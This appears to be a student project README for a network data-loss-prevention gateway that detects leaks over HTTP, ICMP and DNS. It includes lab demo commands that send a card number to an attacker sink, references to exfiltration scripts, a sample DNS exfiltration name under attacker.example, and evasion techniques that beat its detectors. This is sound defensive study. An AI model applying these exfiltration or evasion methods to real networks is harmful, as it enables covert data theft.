# Network Data Loss Prevention (DLP) Project for DD2391

Our project is a containerized network security environment with a gateway designed to detect and mitigate unauthorized data exfiltration across both standard application traffic and network-level covert channels.


## Team & Workstreams

| Member | Workstreams | Core Responsibilities |
| --- | --- | --- |
| **Antoine** | A, C, D | Docker network infrastructure & base attack scripts (WS A); ICMP covert channel detection (WS C); cross-validation, evasion testing against DNS detector and consequent patch hardening (WS D.1); qualitative limits analysis, bounds, and architectural alternatives (WS D.2). |
| **Diogo** | B, D | L7 Web DLP engine & inspection rules (WS B); internal peer-testing & evasion on L7 detectors (WS D.1); global quantitative evaluation, latency/performance limits, and dataset/tool benchmarking (WS D.2, shared workload with Jonas & Sofia). |
| **Jonas** | B, D | L7 Web DLP engine & payload decoding (WS B); internal peer-testing & evasion on L7 detectors (WS D.1); global quantitative evaluation, latency/performance limits, and dataset/tool benchmarking (WS D.2, shared workload with Diogo & Sofia). |
| **Sofia** | C, D | DNS covert tunnel detection & heuristics (WS C); cross-validation & evasion testing against ICMP detector (WS D.1); global quantitative evaluation, latency/performance limits, and dataset/tool benchmarking (WS D.2, shared workload with Diogo & Jonas). |


## Problem Statement

While standard perimeter security predominantly focuses on preventing intrusion as well as lateral movement, a robust security posture must also assume compromise and restrict what actors can extract, directly defending the **Confidentiality** pillar of the *CIA triad*. **Network Data Loss Prevention (DLP)** addresses this challenge by identifying and intercepting unauthorized data outputs.

**In practice, data leaks fall into two distinct categories:**
  - **Accidental & Negligent Exposure:** Legitimate users committing operational mistakes, such as pasting sensitive credentials / secrets into web forms, or uploading corporate data to unapproved personal devices.
  - **Intentional & Adversarial Exfiltration:** Malicious insiders or compromised devices deliberately evading standard proxy filters by tunneling stolen secrets through lower-level protocols *(such as ICMP echo payloads or DNS queries)*.

To address both fronts, this project implements a gateway with two layers: deterministic L7 content inspection, as well as passive L3/L4 covert-channel analysis. Rather than testing detection logic as isolated scripts, our systems are embedded directly into a containerized network topology mirroring a real-world enterprise deployment so as to evaluate detection efficiency, flaws, latency, and false positives under live conditions.

### Threat Model & Assumptions

We evaluate traffic originating from an internal client (`172.20.0.3`), covering both **adversarial activity** *(an attacker with remote code execution or a malicious insider)* and **accidental exposure** by authorized users *(e.g., pasting API tokens, submitting cleartext payment records)*. In all scenarios, the objective is to **prevent sensitive data from leaving the monitored boundary** toward an untrusted external endpoint (`172.21.0.10`).

#### 1. In-Scope Attack Vectors

- **Application-Layer Leaks (WS B - L7 Web):**
  * *PII Exposure:* Cleartext form submissions containing structured records *(e.g., credit card numbers validated via regex and Luhn checksum)*.
  * *Credentials & Secrets:* High-entropy strings *(raw API tokens, private keys, Base64-encoded secrets)* in HTTP request bodies, URIs, or JSON payloads.
  * *Encoding Evasion:* Standard payload transformations intended to bypass naive string matching.

- **Network-Layer Covert Channels (WS C - L3/L4):**
  * *ICMP Tunneling:* Arbitrary data smuggled into ICMP Echo Request payloads.
  * *DNS Covert Channels:* Exfiltration via subdomain labels resolved against an attacker-controlled apex domain.

#### 2. Out-of-Scope & Security Assumptions

- **Gateway Platform Integrity:** The gateway host OS, Docker runtime, and detector process are trusted.
- **TLS Trust Boundary:** Internal clients trust the gateway's root CA, allowing standard TLS termination and cleartext payload inspection at L7.
- **Excluded Covert Channel Techniques:** Other covert vectors are out of scope. This includes:
  - Protocol timing or packet-interval modulation (*timing channels*).
  - Other alternative ICMP and DNS exfiltration vectors.
- **Advanced Steganography:** Multimedia data hiding or other custom disguised encrypted protocols.
- **Out-of-Band Channels:** Physical side-channels, cellular links, or any egress path bypassing our gateway topology.


## System Architecture & Detection Mechanisms

### 1. Network Architecture & Interception Topology

The DLP gateway is deployed as a dual-homed bridge separating the *trusted enterprise subnet* (`internal_net`, `172.20.0.0/24`) from the *untrusted external network* (`external_net`, `172.21.0.0/24`).

![Architecture diagram](docs/visuals/architecture.png)

*(Full network scripts and container configurations are documented in `docs/architecture.md`).*

### 2. Workstream B: Inline L7 Web DLP Engine

The L7 engine runs inside mitmproxy and checks every outbound HTTP(S) request before it is forwarded. Each request goes through three stages: collect scannable text, scan it, and decide whether to forward or block.

- **Stage 1 — Input collection:** The addon scans the URL path, every query parameter, all request headers (including `Cookie`, `Authorization`, and any custom headers) and the request body. Bodies go through `decode_body` which handles `application/x-www-form-urlencoded` (percent-escapes decoded, so `card=4111%2D1111...` becomes a flat PAN), `application/json` (recursed through to flatten scalar values out of nested objects), or any other type as plain UTF-8. Malformed input falls back to UTF-8 instead of crashing. Invisible characters (zero-width space etc.) are stripped before scanning so attackers cannot hide separators inside digit runs.

- **Stage 2 — Multi-detector scan (`scan_all`):** Each collected string goes through three detectors that share a common `Finding` output:
  - `regex_rules`: Patterns for well-known credentials: AWS keys, GitHub tokens, OpenAI / Anthropic / Google API keys, JWTs, Stripe keys, Cloudflare tokens. Patterns were derived from official documentation and other blogs and forum discussions about them (mentioned in `RESOURCES.md`).
  - `luhn`: Credit-card detection in three steps. A regex finds 12–19 digit runs with optional spaces, dots, dashes or underscores. Each candidate is checked against the Luhn checksum. Luhn-valid numbers are then matched to real issuers (Visa, Mastercard, Amex, Maestro, JCB, UnionPay, ...) by BIN prefix and length, which drops numbers that are Luhn-valid but not actual cards.
  - `entropy`: Shannon entropy per character over whitespace-separated tokens. Tokens above the threshold are flagged. The threshold for L7 is set to 4.7 bits, since natural english is usually between 2.14 and 4.76. This way it will detect some false positives in L7 but that was considered better than letting a "normal" entropy secret pass. The `shannon_entropy` function is also used by the DNS detector. DNS detector has a different threshold. 

- **Stage 3 — Alert and block:** On any finding the addon logs a `[DLP-ALERT]` through the shared logger. Matched substrings pass through `detection.common.mask.mask()` so a card number appears as `4111********1111` in the log, not as cleartext. The addon then sets `flow.response` to a 403, which stops mitmproxy from forwarding. The victim sees the 403, the attacker sink sees nothing.

*(Full design and WS-D.1 evasion cases are in `docs/l7-web-detection-mechanism.md`.)*

### 3. Workstream C & D.1: Covert Channel Detection & Evasion Hardening

#### 3.1 ICMP Covert Channel Detection (WS C)

Standard operating systems generate predictable **ICMP Echo *Request* packets**. To detect data tunneling without introducing latency, `icmp_detector.py` evaluates captured frames using three passive checks:

- **Structural verification (`check_structure`):** Standard OS ping utilities use consistent payload layouts *(Linux defaults to 56 bytes with an 8-byte timestamp; Windows uses 32 fixed ASCII bytes)*. Packets deviating from these conventions trigger:
  - `icmp_oversized_payload`: Payloads exceeding the standard 64-byte limit (`MAX_STANDARD_PAYLOAD_SIZE`).
  - `icmp_non_standard_size`: Frame sizes deviating from standard 32- or 56-byte patterns.
  - `icmp_abnormal_pattern`: Standard-sized frames containing arbitrary exfiltrated bytes instead of the expected OS byte sequences.


- **Payload Content Scanning (`check_content`):** Payloads that pass structural checks are forwarded to the shared L7 engine (`detection.l7_web.scan_all`) to scan for sensitive data *(e.g cleartext credentials or credit cards embedded in the data - see WS B)*.

- **Sliding-Window Frequency Tracking (`ICMPRateTracker`):** Tracks packet timestamps per source IP over a 1-second sliding window, raising `icmp_high_frequency` if request rates exceed a defined threshold (4 packets/second).

*(Details available in `docs/icmp-detection-mecanism.md`).*

#### 3.2 ICMP Evasion Analysis & Hardening (WS D.1)

An adversarial review of the baseline ICMP detector exposed a validation gap in the Linux-ping whitelist: a packet that the detector accepted as a benign Linux ping could still smuggle data in bytes that were never inspected. The whitelist confirmed only that the payload was 56 bytes long and that its fixed 40-byte tail matched the Linux pattern, but it skipped the first 16 bytes, which hold a timestamp that legitimately changes, and it never looked at the ICMP identifier and sequence fields. This left roughly 20 attacker-controlled bytes in every "benign" ping that tripped none of the structure, rate, or content checks, which is enough for a steady covert exfiltration channel.

The finding was filed as issue #11 and pinned as the regression test `test_whitelisted_linux_ping_prefix_is_still_inspected`. The fix, in commit `ea2ac4c`, now validates the 16-byte timeval prefix and routes the identifier and sequence bytes through the Layer 7 content scanner, closing the channel. The hardening carried a measurable cost: in the offline evaluation it roughly doubled the benign ICMP false-positive rate, from 27% to 65% of sessions, because default Linux pings no longer match the expected pattern and now trip `icmp_abnormal_pattern`, while malicious detection stayed at 100%. This detection-versus-precision trade-off is quantified in section 4.1.

#### 3.3 DNS Covert Tunnel Detection (WS C)

DNS tunneling hides exfiltrated data inside the **query name (QNAME)** of outbound lookups, which egress freely even on locked-down networks. `dns_detector.py` keeps only queries (`qr == 0`), splits each QNAME into an **apex** (the last two labels) and the **subdomain** labels left of it, and applies four passive checks:

- **Length (`DNS_LONG_QNAME`):** flags a single label of ≥ 20 characters or a total  QNAME of ≥ 50 characters — the naive case of stuffing a whole secret into one name.
- **Entropy (`DNS_HIGH_ENTROPY`):** computes Shannon entropy **per label** and flags labels of ≥ 16 characters with H ≥ 3.8 bits/char, catching hex/base32/base64-encoded payloads. Per-label (not whole-string) scoring resists entropy-dilution padding.
- **Volume (`DNS_TUNNEL_VOLUME`):** tracks unique subdomains under one apex per source and flags ≥ 8 distinct subdomains within a 60-second sliding window, catching burst (and, within the window, slow) transfers.
- **Content (`DNS_SENSITIVE_DATA_*`):** forwards decoded labels to the shared L7 engine (`detection.l7_web.scan_all`) for regex / Luhn checks on cleartext credentials and card numbers (see WS B).

Thresholds are environment-overridable (`DNS_LABEL_LEN_THRESHOLD`,`DNS_ENTROPY_THRESHOLD`, `DNS_VOLUME_THRESHOLD`, …) for tuning without code changes.
*(Detailed design available in `docs/dns-detection-mechanism.md`).*

#### 3.4 DNS Evasion Analysis & Hardening (WS D.1)

Adversarial testing against the baseline DNS detector uncovered algorithmic flaws, short-string entropy limits, and architectural trade-offs.

##### Evasion & Hardening Summary

| # | Vector | Technique & Target Rule | Category | Status |
| --- | --- | --- | --- | --- |
| **1** | **Entropy Dilution** | Padding subdomains with static characters to lower average entropy below 3.8 (`DNS_HIGH_ENTROPY`) | Algorithmic Flaw | **Patched** ([PR #4](https://github.com/AntoineQ1/DLPDetection/pull/4)) |
| **2** | **Multi-Label Slicing** | Slicing 20–45 char secrets across multiple short sub-labels (`DNS_LONG_QNAME`) | Algorithmic Flaw | **Patched** ([PR #6](https://github.com/AntoineQ1/DLPDetection/pull/6)) |
| **3** | **Micro-Chunking** | Splitting secrets into $<14$ char chunks to remain below theoretical entropy bounds | Mathematical Bound | *Documented Limitation* |
| **4** | **Multi-Query Splitting** | Splitting card numbers across sequential queries to evade regex and Luhn checks | Architectural Limit | *Documented Limitation* |
| **5** | **DNS over TCP/53** | Forcing TCP transport to bypass Scapy's UDP BPF filter | Architectural Limit | *Documented Limitation* |
| **6** | **Low-and-Slow Beaconing** | Sending 1 query every 10–15s to evade the 60-second sliding volume window | Operational Trade-off | *Documented Limitation* |

##### Key Vulnerabilities & Applied Patches

- **Entropy Dilution (Patched - PR #4):**
  - *Bypass:* Computing Shannon entropy across the concatenated subdomain string allowed an attacker to pad a 16-character secret ($H \approx 4.0$) with repetitive characters (`aaa...`), pulling aggregate entropy down to $\sim 1.5$.
  - *Hardening:* Added per-label maximum entropy checking. Individual labels with $\ge 16$ characters and $H \ge 3.8$ now trigger `DNS_HIGH_ENTROPY` regardless of surrounding padding.

- **Label Fragmentation (Hardened Branch):**
  - *Bypass:* Mapping binary data to dictionary words across multiple short labels (`winter.forest.silver.pocket.attacker.example`) kept individual labels $< 20$ characters, total length $< 50$ characters, and entropy low ($H \approx 3.1$).
  - *Hardening:* Added a sub-label count threshold (`sub_label_count >= 4`), forcing payloads into fewer, longer labels that trip length rules.

- **Fundamental Bounds & Trade-offs:**
  - *Micro-chunking ceiling:* Strings shorter than 14 characters mathematically cannot reach $3.8\text{ bits/char}$ ($\log_2 N < 3.8$). Lowering thresholds to catch them causes heavy false-positive rates on common hostnames (e.g., `auth-service`).
  - *Stateless fragmentation:* Splitting secrets across separate packets evades single-query inspection. Addressing this requires stateful stream reassembly or central logging on a recursive resolver.
  - *Low-and-slow beaconing:* Pacing queries at 10-second intervals evades 60-second sliding windows. Extending windows to several hours significantly increases memory usage and raises false positives from benign background DNS queries.

*(Attack scripts, test queries, and validation outputs are documented in `docs/dns-evasion-hardening.md`).*

### 4. Workstream D.2: Global Performance, Latency & Benchmark Evaluation

#### 4.1 Quantitative Benchmarking & Performance Metrics

**DNS and ICMP**
We benchmark the DNS and ICMP detectors offline by replaying captures through the production parsers and detection functions. Each capture is built by calling the covert-channel tools' own packet builders with seeded dummy inputs, so no traffic is ever transmitted, and the measurement reflects the deployed detector rather than a re-implementation. The primary metric is the per-session classification (true/false positive and true/false negative) over 100 malicious and 100 benign sessions per protocol, where a session counts as detected if any of its packets raises an alert. The benign traffic is deterministic local fixtures that deliberately include borderline-but-legitimate patterns, so the false-positive rates describe this designed sample rather than deployment conditions.

For DNS the 100 malicious sessions come from two independent tools: 99 from `zrckr/dns-tunnel` (50 text transfers and 49 file transfers) and one recorded transfer from iodine, a second tool that also appears in the peer-reviewed literature. The detector identified 94 of the 100 malicious sessions (94%) and flagged 30 of the 100 benign sessions (a 30% false-positive rate on the adversarial mix). The six missed sessions are all short, single-query text transfers whose encoded names stay below the length and entropy thresholds while making too few queries to trip the volume rule.

| Scenario | Label | Sessions | Outcome |
| --- | --- | ---: | --- |
| `tool_file_exfil` (zrckr) | malicious | 49 | 49 TP |
| `tool_text_exfil` (zrckr) | malicious | 50 | 44 TP / 6 FN |
| `iodine_reference` | malicious | 1 | 1 TP |
| `ordinary_lookup` + `service_discovery` | benign | 70 | 70 TN |
| `cache_busting` | benign | 20 | 20 FP (`DNS_LONG_QNAME`) |
| `ordinary_lookup_burst` | benign | 10 | 10 FP (`DNS_TUNNEL_VOLUME`) |

For ICMP the 100 malicious sessions are split evenly between `DhavalKapil/icmptunnel` (50 sessions of raw framing) and the Smendowski covert-channel tool (50 sessions of base64 payloads), chosen so that together they exercise all three detection paths. The detector identified every malicious session (100%) and flagged 65 of the 100 benign sessions (a 65% false-positive rate). As explained in §3.2, that elevated benign rate is the direct consequence of hardening the Linux-ping whitelist: default Linux pings now trip `icmp_abnormal_pattern`.

| Scenario | Label | Sessions | Outcome |
| --- | --- | ---: | --- |
| `icmptunnel_oversized` | malicious | 20 | 20 TP (structure) |
| `icmptunnel_tiny` | malicious | 10 | 10 TP (structure) |
| `icmptunnel_burst` | malicious | 10 | 10 TP (rate) |
| `icmptunnel_secret` | malicious | 10 | 10 TP (content) |
| `smendowski_base64_exfil` | malicious | 50 | 50 TP (content) |
| `windows_default_ping` | benign | 35 | 35 TN |
| `linux_default_ping` | benign | 38 | 38 FP (`icmp_abnormal_pattern`) |
| `custom_*_byte_ping` | benign | 27 | 27 FP (pattern / size / oversized) |

**Layer 7 (HTTP)**

The L7 Web methodology is deliberately different from the covert-channel one. DNS and ICMP use published attack tools (`zrckr/dns-tunnel`, `icmptunnel`, Smendowski) to generate 100 malicious sessions each. No equivalent canonical open-source L7-DLP attack tool exists; the standard L7-DLP benchmarks in industry either use proprietary curated HAR dumps or hand-crafted PCI/API-key samples. We therefore evaluate L7 against a hand-crafted corpus of 14 malicious and 10 benign sessions (`evaluation/run_l7_eval.py`), with scenarios chosen for coverage breadth rather than statistical volume. This is reasonable here because the L7 pipeline is deterministic per request (same input → same findings), so additional samples of the same attack technique add no new insight. What matters is attack-vector diversity. The malicious corpus covers credit cards (Visa, Mastercard, Amex, nested JSON, URL-encoded separators), API tokens (AWS, GitHub, OpenAI, JWT, Stripe), and three evasion attacks (invisible-unicode, gzip, multi-request chunking). The 10 benign scenarios deliberately stress potential false-positive paths (SHA256 hash, UUID, random 16-digit order id, IPv4 pair, long plain text). The scanner is called directly through `decode_body` + `scan_all`, mirroring the exact code path the mitmproxy addon takes on live traffic.

The detector identified 12 of the 14 malicious sessions (85.7%) and flagged 0 of the 10 benign sessions (0% false-positive rate). The two missed sessions are our own evasions documented in `docs/l7-evasion-hardening.md`: `visa_gzipped` (compression wrapping, countermeasure available as an opt-in decoder patch) and `visa_chunked` (architectural limit: stateless per-request inspection cannot reassemble secrets split across separate HTTP flows).

| Scenario | Label | Sessions | Outcome |
| --- | --- | ---: | --- |
| Credit cards (Visa, Mastercard, Amex, nested JSON, URL-encoded) | malicious | 6 | 6 TP (`luhn_cc`) |
| API tokens (AWS, GitHub, OpenAI, JWT, Stripe) | malicious | 5 | 5 TP (regex) |
| `visa_zero_width` (invisible-unicode evasion, patched) | malicious | 1 | 1 TP |
| `visa_gzipped` (compression evasion, opt-in patch) | malicious | 1 | 1 FN |
| `visa_chunked` (multi-request split, architectural limit) | malicious | 1 | 1 FN |
| Normal web/API traffic (10 scenarios) | benign | 10 | 10 TN |

Latency is measured in two complementary ways. The detector pipeline (`decode_body` + `scan_all`) is timed in isolation with `time.perf_counter_ns` across 100 iterations per request. End-to-end latency is sampled from the victim container through the full mitmproxy + Docker stack (10 iterations per scenario, warm-up excluded).

| Measurement | Scenario | Median | Max |
| --- | --- | ---: | ---: |
| Pipeline-isolated | all requests | 15 μs | 45 μs |
| End-to-end | clean passthrough | 5.2 ms | 7.9 ms |
| End-to-end | blocked card (form) | 3.8 ms | 5.2 ms |
| End-to-end | blocked card (nested JSON) | 4.0 ms | 5.9 ms |

The two scales differ by roughly three orders of magnitude: the detection logic itself contributes under 0.5% of the request's total round-trip time, with the remainder dominated by TLS termination, mitmproxy forwarding, and Docker's inter-container networking. The blocked-card path is slightly faster than clean passthrough because mitmproxy short-circuits the forward step once a Finding is produced, saving one hop to the attacker-side sink. See `evaluation/l7_web/REPORT.md` and `evaluation/l7_web/sessions.csv` for per-scenario detail.

#### 4.2 Qualitative Analysis: Limits, Architectural Trade-offs & Defense-in-Depth

##### 1. Architectural Trade-offs & Intrinsic Prototype Limits

Our gateway uses a hybrid architecture combining an inline L7 proxy (`mitmproxy`), which detects (and is able to block) unauthorized HTTP/HTTPS requests, and a passive L3/L4 sniffer (using `Scapy`), which inspects ICMP and DNS channels.

This split between **request-scoped L7 stream inspection** and **packet-by-packet L3/L4 detection** reflects a deliberate trade-off between detection depth, implementation complexity, and performance:
- **Why synchronous inline inspection fits L7:** HTTP traffic naturally operates in discrete, complete requests. This makes it straightforward for mitmproxy to hold an outbound request, unpack its payload, and run inspection rules before deciding whether to forward it or block it. Because web clients already tolerate small processing delays, this synchronous check provides real-time prevention with minimal noticeable impact.
- **Why lightweight passive sniffing fits L3/L4:** On connectionless protocols like UDP and ICMP, inspecting packets individually keeps memory usage flat and introduces zero forwarding latency. While stateful stream reassembly is technically feasible (as demonstrated by enterprise DPI and NIDS engines), implementing robust session tracking, chunk reassembly, and similar advanced mechanisms in a lightweight Python sniffer would substantially increase complexity and memory consumption, making it out of scope for this academic project.

Consequently, our adversarial evaluation highlighted three fundamental categories of detection boundaries across the gateway:
- **Mathematical Bounds:** Information-theoretic heuristics like Shannon entropy require a minimum sample length to be statistically meaningful. When attackers split data into micro-chunks, the theoretical maximum entropy of short strings stays below detection thresholds, and lowering those thresholds becomes unviable due to high false-positive rates on normal traffic.
- **Architectural Limits:** Because both our passive L3/L4 sniffer and our request-scoped L7 proxy evaluate transmissions in isolation, they are blind to secrets split across multiple consecutive packets or HTTP requests (evading multi-character regex and Luhn checks). Likewise, protocol-specific capture filters (such as sniffing only UDP port 53) can be bypassed by shifting to alternative transports like DNS over TCP or encrypted channels (DoH/DoT).
- **Operational Trade-offs:** Rate and volume detectors rely on short in-memory sliding windows to bound memory usage (1s for ICMP, 60s for DNS). Attackers can evade these thresholds through *low-and-slow* pacing so earlier entries expire before triggering an alert, whereas extending windows to several hours would increase both memory overhead and false alarms on legitimate background traffic.

##### 2. Attacker/Defender Asymmetry & Evolution of DLP Controls

These limitations illustrate a core asymmetry in network security: while an attacker only needs to find a single blind spot *(an unhandled encoding, an alternate transport protocol, or a slow transmission rate)* to exfiltrate data, the defender must account for *all possible vectors* without disrupting legitimate traffic.

Given the time constraints of an academic project, we focused on a representative subset of payload-based exfiltration across HTTP, ICMP Echo (Type 8), and DNS subdomains. In a production environment, DLP capabilities can be extended along two complementary axes:
- **Hardening the Network Gateway:** Moving from passive alerting to active blocking on L3/L4 channels, adopting a dedicated DPI engine for stateful TCP stream reassembly, and inspecting packet timing patterns to detect low-and-slow exfiltration or timing channels
- **Broadening the DLP Spectrum:** Data loss prevention extends beyond network packet inspection. Depending on organizational needs, controls range from simple deterministic policies *(such as blocking outbound emails or attachments to external domains)* to Endpoint DLP agents running directly on workstations *(preventing users from copying and pasting sensitive text or writing to removable USB media)*, up to behavioral and AI-assisted anomaly detection.

##### 3. Risk-Driven Security & Defense-in-Depth

Security architecture decisions ultimately depend on **threat modeling** and **risk tolerance**. An environment handling highly classified assets may require strict physical and electromagnetic isolation (*air-gapping*), making a network DLP gateway unnecessary. Conversely, when an organization requires external connectivity to operate, deploying a dedicated DLP layer meaningfully reduces exposure to both accidental leaks and adversarial exfiltration.

Even then, a network DLP gateway is not an all-in-one silver bullet; it acts as a perimeter safety net within a broader **Defense-in-Depth** strategy alongside foundational security controls:
- **Identity & Access Management (IAM) & Least Privilege:** Restricting access to sensitive databases, API keys, and confidential documents to authorized users and services directly reduces the amount of data exposed to accidental leaks or host compromise.
- **Egress Firewalling & Managed DNS Architecture:** Pairing the gateway with strict firewall rules that block direct outbound traffic on port 53, forcing internal hosts through an enterprise recursive DNS resolver equipped with query logging and *Response Policy Zones (RPZ)*.
- **Centralized SIEM Correlation & Threat Intelligence:** Forwarding standardized `[DLP-ALERT]` events and resolver logs to a SIEM enables aggregation over extended time horizons and cross-referencing against external **Threat Intelligence** feeds *(such as Newly Observed Domains or reputation blocklists)* to catch stealthy threats, such as slow exfiltration, that slip past short real-time windows.

## Repository Structure

```text
attacks/               # Exfiltration generators (web, dns, icmp)
config/certs/          # CA certificate generation for TLS inspection
detection/
  common/              # Shared types, logger, and alerting
  covert_channel/      # L3/L4 sniffer, ICMP and DNS detection engines
  l7_web/              # Mitmproxy addon, Luhn, regex & entropy rules
docker/                # Dockerfiles and network entrypoints
docs/                  # In-depth architectural notes, mechanisms and guides
servers/               # Attacker listeners (HTTP, DNS, ICMP sinks)
tests/                 # Offline unit tests
docker-compose.yml     # Container architecture definition
pyproject.toml         # Python environment (managed by uv)

```

## Quick Start

### 1. Prerequisites

- Docker & Docker Compose
- [uv](https://docs.astral.sh/uv/)

### 2. Launch the Lab

Generate the test CA certificate required for TLS interception (first run only):

```bash
./config/certs/generate_ca.sh
```

Start the containers:

```bash
docker compose up -d
docker compose ps
```

## Verification & Demos

> For complete walk-throughs and expected alert outputs, see the **[Live Demo Cheatsheet](docs/demo_guide.md)**.

### 1. Web Layer DLP (Inline Blocking)

```bash
# Legitimate traffic -> Allowed (200 OK)
docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "user=alice&status=ok"

# Data exfiltration -> Blocked by Gateway (403 Forbidden)
docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "card=4111-1111-1111-1111"
```

*Inspect logs:* `docker compose logs -f gateway`

### 2. ICMP Covert Channel (Passive Detection)

```bash
# Normal diagnostic ping -> no alert
docker compose exec victim ping -c 2 172.21.0.10

# Oversized payload exfiltration -> alert triggered
docker compose exec victim python attacks/icmp_exfiltrate.py --mode oversized
```

*Details:* [docs/icmp-detection-mecanism.md](docs/icmp-detection-mecanism.md)

*Inspect logs:* `docker compose logs -f covert-detector`

### 3. DNS Covert Channel (Passive Detection)

```bash
# Encoded DNS tunnel exfiltration -> Alert triggered
docker compose exec victim python attacks/dns_exfiltrate.py --secret "CONFIDENTIAL_KEY" --mode base32
```

*Details & stealth levels (D1–D4):* [docs/dns-detection-mechanism.md](docs/dns-detection-mechanism.md)

*Inspect logs:* `docker compose logs -f covert-detector`

## Local Development & Offline Tests

You can run test suites locally without starting Docker:

```bash
# Set up virtual environment and sync dependencies
uv sync

# Run all offline test suites
uv run pytest
```

## Standardized Alert Format

Both the inline proxy and passive sniffers output standardized JSON records prefixed with `[DLP-ALERT]`:

```json
[DLP-ALERT] {
  "timestamp": 1790333178.47,
  "channel": "DNS_COVERT",
  "rule_id": "DNS_HIGH_ENTROPY",
  "severity": "high",
  "source_ip": "172.20.0.3",
  "destination": "attacker.example",
  "blocked": false,
  "details": { "qname": "...", "qtype": "A", "entropy": 4.07, "payload_len": 57 }
}
```

## Documentation Index

*The following files are NOT considered to be part of the report, but this list aims at explaining the role of each file.*

- **[docs/architecture.md](docs/architecture.md)**: Full network topology, container orchestration, routing, and interception design.
- **[docs/demo_guide.md](docs/demo_guide.md)**: End-to-end evaluation cheat sheet and demo steps.
- **[docs/icmp-detection-mecanism.md](docs/icmp-detection-mecanism.md)**: ICMP structural checks, rate-limiting, and deep content inspection.
- **[docs/dns-detection-mechanism.md](docs/dns-detection-mechanism.md)**: DNS tunneling taxonomy (D1–D4), Shannon entropy, and volume heuristics.
- **[docs/uv_guide.md](docs/uv_guide.md)**: Dependency management and workflow with `uv`.
- **[docs/evaluating-hardening-branches.md](docs/evaluating-hardening-branches.md)**: Git evaluation procedure for defense hardening branches.
- **[docs/AI_USE.md](docs/AI_USE.md)**: Academic statement on generative AI usage.

## Ethics & Usage

Academic project. Do not deploy or execute against external networks without explicit authorization. See [LICENSE.md](LICENSE.md).

## References

### 1. Protocols & Core Standards

- Postel, J. (1981). *Internet Control Message Protocol*. RFC 792. IETF. [https://www.rfc-editor.org/rfc/rfc792](https://www.rfc-editor.org/rfc/rfc792)
- Mockapetris, P. (1987). *Domain Names - Implementation and Specification*. RFC 1035. IETF. [https://www.rfc-editor.org/rfc/rfc1035](https://www.rfc-editor.org/rfc/rfc1035)
- Fielding, R., Nottingham, M., & Reschke, J. (2022). *HTTP Semantics*. RFC 9110. IETF. [https://www.rfc-editor.org/rfc/rfc9110](https://www.rfc-editor.org/rfc/rfc9110)
- Chen, S. et al. (2021). A study of DNS covert-channel detection. Computers & Security 104, 102095. https://doi.org/10.1016/j.cose.2020.102095
- Zheng et al. (2025). Evaluation of DNS tunnel tools and reproducible sample generation. https://www.joca.cn/EN/10.11772/j.issn.1001-9081.2024070972
- Tu, L. et al. (2022). ICMPTend: ICMP covert-tunnel detection using SVM. Computers, Materials & Continua 73(1). https://doi.org/10.32604/cmc.2022.022540
- Fokin, D. and Yevdokymenko, M. (2025). An Overview of Covert Channels in Software Defined Networks. IEEE IDAACS. https://doi.org/10.1109/IDAACS68557.2025.11322109
- Tools: zrckr/dns-tunnel; the iodine capture from Korving-F/dns-tunnel-dataset; DhavalKapil/icmptunnel; and the Smendowski hidden-communication-using-covert-channels project. todo(add links)

### 2. Workstream B: L7 Web DLP & Content Inspection

- Luhn, H. P. (1960). *Computer for verifying numbers*. US Patent 2,950,048.
- Shannon, C. E. (1948). *A Mathematical Theory of Communication*. Bell System Technical Journal, 27, 379–423. https://doi.org/10.1002/j.1538-7305.1948.tb01338.x
- Wikipedia contributors. *Luhn algorithm*. https://en.wikipedia.org/wiki/Luhn_algorithm (reference specification followed when writing `luhn_valid`).
- Wikipedia contributors. *Payment card number* (ISO/IEC 7812 overview and issuer identification number ranges). https://en.wikipedia.org/wiki/Payment_card_number (source for the ~36 issuer BIN prefix ranges and allowed lengths compiled into `ISSUERS`).
- Secret-pattern inventories compiled into `detection/l7_web/regex_rules.py`:
  [Gitleaks](https://github.com/gitleaks/gitleaks),
  [GitHub Secret Scanning supported patterns](https://docs.github.com/en/code-security/secret-scanning/introduction/supported-secret-scanning-patterns),
  [Truffle Security's trufflehog](https://github.com/trufflesecurity/trufflehog),
  [Mazin Ahmed's secrets-patterns-db](https://github.com/mazen160/secrets-patterns-db).
- [mitmproxy](https://mitmproxy.org/) (HTTPS interception and addon runtime).
- [Stripe test card inventory](https://docs.stripe.com/testing#cards) (published test PAN values used in the L7 benchmark corpus).

### 3. Workstream C: ICMP Covert Channel Detection

- Sayadi, A., Lehsaini, M., & Bitam, S. (2017). *Detection of Covert Channels Over ICMP Protocol*. In 2017 IEEE/ACS 14th International Conference on Computer Systems and Applications (AICCSA) (pp. 573–579). IEEE.
- *[Placeholder: Add any specific sources or papers used by Antoine]*

### 4. Workstream C: DNS Covert Channel Detection

- *[Placeholder: Add any specific sources or papers used by Sofia]*

## Individual contributions

### Individual contribution: Antoine

#### 1. Network infrastructure & environment orchestration (WS A)

- **Multi-host topology & network isolation:** Designed the containerized topology in `docker-compose.yml`, provisioning four dedicated nodes (`victim`, `gateway`, `covert-detector`, and `attacker`) across isolated internal (`172.20.0.0/24`) and external (`172.21.0.0/24`) subnets with custom Dockerfiles and static IP allocations.
- **Host configuration & traffic interception:** Built custom container entrypoint scripts to manage host networking, including default client routing on the victim, `iptables` PREROUTING port redirection for HTTP/HTTPS to mitmproxy, and outbound MASQUERADE NAT on the gateway.
- **TLS inspection & sniffer integration:** Automated local root CA generation and client trust-store setup to enable transparent HTTPS inspection via mitmproxy, while coupling the passive sniffer directly to the gateway network namespace.
- **Environment & dependency management:** Standardized local development workflows and container builds across the team using Astral's `uv` package manager and lockfiles to guarantee reproducible environments.

#### 2. ICMP covert channel detection & validation (WS C)

- **Protocol & related use as a covert channel research:** Analyzed ICMP protocol mechanics and prior research (Sayadi et al., AICCSA 2017) to examine how echo requests can be exploited for covert data exfiltration and to establish baseline heuristics based on normal OS behavior.
- **Detection pipeline (`icmp_detector.py`):** Built a passive inspection module combining:
  - *Structural checks:* Profiled benign Linux (56-byte kernel timestamp) and Windows (32-byte sequence) defaults to flag oversized (> 64 B), unexpected lengths, or non-standard payloads.
  - *Rate limiting:* Tracked per-source frequency using a sliding window to catch burst exfiltration.
  - *L7 content reuse:* Reused the shared L7 scanner directly on raw ICMP payloads to detect cleartext credentials and credit cards inside ping data.
- **Attack scripts & external sink:** Developed the attacker listener (`servers/icmp_sink.py`) and an exfiltration script (`attacks/icmp_exfiltrate.py`) covering primary attack scenarios (benign baseline, oversized frames, cleartext leaks, and rapid bursts) for reproducible testing and live demonstrations.

#### 3. Adversarial DNS evasion research & hardening (WS D.1)

